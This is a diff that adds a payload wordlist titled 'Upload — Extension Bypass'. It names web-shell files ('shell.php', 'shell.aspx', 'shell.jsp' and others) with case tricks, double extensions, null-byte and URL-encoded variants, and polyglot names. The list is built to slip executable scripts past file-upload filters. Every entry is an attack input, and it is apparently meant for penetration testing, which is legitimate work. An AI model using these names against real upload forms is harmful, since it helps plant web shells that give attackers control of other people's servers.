@@ -1,0 +1,103 @@
+# ============================================================
+# Upload — Extension Bypass
+# ============================================================
+
+# ---- PHP Extensions ----
+shell.php
+shell.php3
+shell.php4
+shell.php5
+shell.php7
+shell.php8
+shell.phtml
+shell.pht
+shell.phpt
+shell.pgif
+shell.shtml
+shell.phar
+shell.inc
+shell.hphp
+shell.ctp
+shell.module
+
+# ---- PHP Uppercase/Mixed ----
+shell.PHP
+shell.PhP
+shell.pHp
+shell.PHp
+shell.pHP
+
+# ---- Double Extension ----
+shell.php.jpg
+shell.php.png
+shell.php.gif
+shell.php.txt
+shell.jpg.php
+shell.png.php
+shell.php%00.jpg
+shell.php\x00.jpg
+shell.php%00
+shell.php%20
+shell.php.
+
+# ---- ASP/ASPX Extensions ----
+shell.asp
+shell.aspx
+shell.asa
+shell.asax
+shell.ascx
+shell.ashx
+shell.asmx
+shell.axd
+shell.cer
+shell.cdx
+shell.ASP
+shell.ASPX
+
+# ---- JSP Extensions ----
+shell.jsp
+shell.jspx
+shell.jsw
+shell.jsv
+shell.jspf
+shell.wss
+shell.do
+shell.action
+shell.JSP
+
+# ---- ColdFusion ----
+shell.cfm
+shell.cfml
+shell.cfc
+shell.dbm
+shell.CFM
+
+# ---- Perl ----
+shell.pl
+shell.cgi
+
+# ---- Python ----
+shell.py
+shell.pyc
+
+# ---- Node.js ----
+shell.js
+shell.json
+
+# ---- Other Script Extensions ----
+shell.sh
+shell.bash
+shell.rb
+shell.rhtml
+shell.erb
+
+# ---- Polyglot / Trick Extensions ----
+shell.php;.jpg
+shell.php%3B.jpg
+shell.php%252e jpg
+shell.p.phphp
+shell.p%68p
+shell%2Ephp
+shell.php....
+shell.php/
+shell/.php
